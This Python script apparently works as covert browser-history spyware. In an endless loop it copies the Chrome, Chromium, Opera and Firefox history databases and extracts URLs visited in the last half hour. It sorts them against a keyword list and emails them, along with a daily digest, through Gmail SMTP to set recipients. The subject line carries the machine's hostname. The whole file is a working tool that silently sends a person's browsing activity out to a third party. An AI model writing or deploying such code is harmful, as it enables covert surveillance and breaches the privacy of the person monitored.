#
import sqlite3
from datetime import datetime, timedelta
import time
from shutil import copyfile
import smtplib
import platform
import os
import chk_his_env as env


#
# _______________________________________VARS_______________________________________________________________________

L_HISTORY_DB = env.L_HISTORY_DB             # print(L_HISTORY_DB)

FF_HIS_FLT = 'his_flt.txt'                  # file created in running dir,  not necessarily where script located(!~)

SQL_QUERY_SELECT_CHROMELIKE = env.SQL_QUERY_SELECT_CHROME
SQL_QUERY_SELECT_FIREFOX = env.SQL_QUERY_SELECT_FIREFOX

gm_u = env.GM_U                             # 'john.woznyak@gmail.com'
gm_pw = env.GM_PW                           # 'Passw0rd!'
L_RECIPIENTS = env.L_RECIPIENTS             # ['kev.mitnick@gmail.com']
SUBJ = platform.node().split('.')[0] + '_'

EMAIL_TEXT = env.EMAIL_TEXT


#
# _______________________________________FUNCTIONS__________________________________________________________________


#
# PyCharm "thinks" that you might have wanted to have a static method, but you forgot to declare it to be
# static (using the @staticmethod decorator). ==> outside of the class
# def db_file_copy(self, db_file):
def db_file_copy(db_file):
    log_ref = '***copy db file***'
    try:
        db_filename_copy = db_file + '_copy'
        copyfile(db_file, db_filename_copy)

        return db_filename_copy

    except Exception as e:
        print('%s %s' % (log_ref, e))


#
def set_query(i_his_db_fname_lwr):
    log_ref = '***set_query***'
    sql_qry_select = ''
    brw = ''
    try:
        if 'firefox' in i_his_db_fname_lwr:
            sql_qry_select = SQL_QUERY_SELECT_FIREFOX
            brw = 'firefox_'
        #
        elif 'opera' in i_his_db_fname_lwr:
            sql_qry_select = SQL_QUERY_SELECT_CHROMELIKE
            brw = 'opera_'
        elif 'chromium' in i_his_db_fname_lwr:
            sql_qry_select = SQL_QUERY_SELECT_CHROMELIKE
            brw = 'chromium_'
        elif 'chrome' in i_his_db_fname_lwr:
            sql_qry_select = SQL_QUERY_SELECT_CHROMELIKE
            brw = 'chrome_'
        #
        # TODO: --- Internet Explorer

        return sql_qry_select, brw

    except Exception as e:
        print('%s %s' % (log_ref, e))


#
def clear_file_content(ff_his_flt):
    log_ref = '***clear_file_content***'
    try:
        with open(ff_his_flt, mode='w') as f:
            f.write('')                                         # WIPE-OUT input file content
    except Exception as e:
        print('%s %s' % (log_ref, e))


#
def chk_msg_yield(ff_his_flt, i_l_yield_vcb):
    log_ref = '***chk_msg_yield***'
    msg_yield = ''
    msg_non_yield = ''

    try:
        with open(ff_his_flt, mode='r') as f:
            f_read = f.read()

        for w in f_read.split('\n'):
            if w is not '':
                if any(y in w for y in i_l_yield_vcb):          # if 'walla' in w.split(',')[1].split('/')[0]:
                    msg_yield += (w + '\n')
                else:
                    msg_non_yield += (w + '\n')

        return msg_yield, msg_non_yield

    except Exception as e:
        print('%s %s' % (log_ref, e))


#
def condense_msg(i_msg):
    log_ref = '***condense_msg***'
    condense_msg_txt = ''
    try:
        for w in i_msg.split(','):                              # fread:  "2020-10-26 10:45:29,google.com/aaa/ab,"
            if '.' in w:                                        # only urls without TS ('2020-10-26 10:45:29')
                short_url = w.split('/')[0]                     # cut before '/' from full link
                condense_msg_txt += ('_'*3) + short_url

        condense_msg_txt += ('\n' + '_' * 150 + '\n'*3)

        return condense_msg_txt

    except Exception as e:
        print('%s %s' % (log_ref, e))


#
def transform_2_sendable(i_msg):
    log_ref = '***transform_2_sendable***'
    msg = ''
    try:
        msg = i_msg.replace(',', '   ')                         # l = file_line.replace('\n', '').split(',')  len(l)->2?

        if msg != '':
            condense_msg_txt = condense_msg(i_msg)
            msg = condense_msg_txt + msg

        return msg

    except Exception as e:
        print('%s %s' % (log_ref, e))


#
def smtp_login_snd_msg(i_subj, i_msg, i_l_recipients):
    log_ref = '***smtp_login_snd_msg***'
    try:
        sent_from = gm_u
        to = i_l_recipients
        subject = i_subj + str(datetime.now())[:19]
        body = i_msg

        email_text = EMAIL_TEXT % (sent_from, ", ".join(to), subject, body)

        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(gm_u, gm_pw)
        server.sendmail(sent_from, to, email_text)
        server.close()
    except Exception as e:
        print('%s %s' % (log_ref, e))


#
def refreshing_daily_mail(i_msg_yield_global_daily):
    log_ref = '***refreshing_daily_mail***'
    try:
        smtp_login_snd_msg(SUBJ,
                           '* * * start * * *___\n' +
                           str(L_HISTORY_DB) +
                           '_' * 100 +
                           i_msg_yield_global_daily,
                           L_RECIPIENTS)

    except Exception as e:
        print('%s %s' % (log_ref, e))


#
#
#  _____________________________________________CLASS________________________________________________________________
class History:
    def __init__(self, mm, sec):
        # self.delta_dd = 0
        self.delta_hh = 3                                       # 3 hour difference !!!
        self.delta_mm = mm
        self.delta_sec = sec                                    # 15    # 300 sec = 5 minutes

    def connect_db(self, db_file):
        log_ref = '***connect_db***'
        try:
            conn = sqlite3.connect(db_file, uri=True)
            # TODO: is "conn" object that needed to be init defined ~~?
            # https://www.sqlitetutorial.net/sqlite-python/sqlite-python-select/
            self.conn_cur = conn.cursor()
        except Exception as e:
            print('%s %s' % (log_ref, e))

    #
    def exe_query(self, sql_select_query):
        log_ref = '***exe_query***'
        try:
            result = self.conn_cur.execute(sql_select_query)
            return result
        except Exception as e:
            # logger.error('%s %s' % (log_ref, e))
            print('%s %s' % (log_ref, e))

    #
    def filter_history_timedelta(self, data, ff_his_flt):
        log_ref = '***filter_history_timedelta***'
        try:
            now = datetime.now()
            last = str(now - timedelta(                         # days=self.delta_dd,
                        # hours=self.delta_hh,                  # needed because of 3-hour difference !!!  (solved!)
                        # comm-out _hh ---> query performed with localtime~flag!
                        minutes=self.delta_mm,
                        seconds=self.delta_sec))[:19]
            l_sel_res_tpl_filter = list(filter(lambda x: x[0] > last, data))        # ~FILTER by "ts" => obj ==> list
            # row=tuple(collection which is ordered and unchangeable('a',1,'b'))   row[1]=2nd field of select
            for row in l_sel_res_tpl_filter:
                # ts = str(datetime.strptime(row[0], '%Y-%m-%d %H:%M:%S') + timedelta(hours=3)) #convert str -> datetime
                ts = str(datetime.strptime(row[0], '%Y-%m-%d %H:%M:%S'))    # no need delta: localtime~flag!!

                # adr = row[1].split('//')[1].split('/')[0]     # 1st split=after '//'     2nd split=before '/'
                # if 'www.' in adr:
                #     adr = adr.split('www.')[1]
                adr = row[1].split('//')[1].replace('www.', '')
                str_out2file = ts + ',' + adr + ','             # 2','~separate condense   str(now)[:19]+','+adr+','+ts
                with open(ff_his_flt, mode='a+') as f:
                    f.seek(0)
                    # prevent duplicates by browser upload process multiple appearances:
                    if str_out2file not in f.read():
                        f.write('%s %s' % (str_out2file, '\r\n'))

        except Exception as e:
            print('%s %s' % (log_ref, e))


#
#
# _____________________________________________MAIN_________________________________________________________________
Running = True

# TODO: request from server delta time to sleep
chrome_his = History(30, 15)            # mm,sec

date_dd = 0

msg_yield_global_daily = ''
l_yield_vcb = env.L_YIELD_VCB


while Running:
    #
    cur_dd = datetime.today().strftime('%d')
    # TODO: noon(12:00) mail
    if date_dd != cur_dd:                                       # on restart(dd=0) + every daychange(or wake from sleep)
        refreshing_daily_mail(msg_yield_global_daily)
        date_dd = cur_dd
        msg_yield_global_daily = ''
        l_yield_vcb += env.get_yield_vcb()

    #
    for his_db in L_HISTORY_DB:
        db_copy = db_file_copy(his_db)

        chrome_his.connect_db(db_copy)

        sql_query_select, browser = set_query(his_db.lower())
        query_data = chrome_his.exe_query(sql_query_select)
        chrome_his.filter_history_timedelta(query_data, FF_HIS_FLT)

        # mb1020: if at first ever run - no files exists ~
        if os.path.isfile(FF_HIS_FLT) and os.path.getsize(FF_HIS_FLT) > 0:
            msg_yield, msg_non_yield = chk_msg_yield(FF_HIS_FLT, l_yield_vcb)
            msg_yield_global_daily += msg_yield.replace(',', ' ' * 3)
            msg = transform_2_sendable(msg_non_yield)
            clear_file_content(FF_HIS_FLT)
            if msg != '':
                smtp_login_snd_msg(SUBJ + browser, msg, L_RECIPIENTS)       # inner if not empty

    #
    time.sleep((chrome_his.delta_mm * 60) + chrome_his.delta_sec - 3)
